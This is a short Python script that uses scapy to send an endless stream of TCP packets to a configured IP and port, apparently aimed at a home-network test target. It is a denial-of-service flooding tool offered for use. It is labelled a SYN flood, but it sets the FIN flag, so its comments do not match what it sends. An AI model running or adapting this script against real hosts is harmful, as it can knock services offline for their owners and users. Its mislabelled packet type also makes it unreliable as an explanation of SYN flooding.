from scapy.all import *
from helper.ip_address import get_ip_address

# Configuration
TARGET_IP = '192.168.188.1'  # Change this to the target IP in your home network
TARGET_PORT = 80  # Change this to the target port
PACKET_COUNT = 1200  # Number of SYN packets to send


def send_syn_flood(target_ip, target_port, count):
    while True:
        for i in range(count):
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags='F')
            packet = ip / tcp
            send(packet, verbose=0)
            print("sent packets")

# Generate SYN flood
send_syn_flood(TARGET_IP, TARGET_PORT, PACKET_COUNT)
# print(f"Sent {PACKET_COUNT} SYN packets to {TARGET_IP}:{TARGET_PORT}")
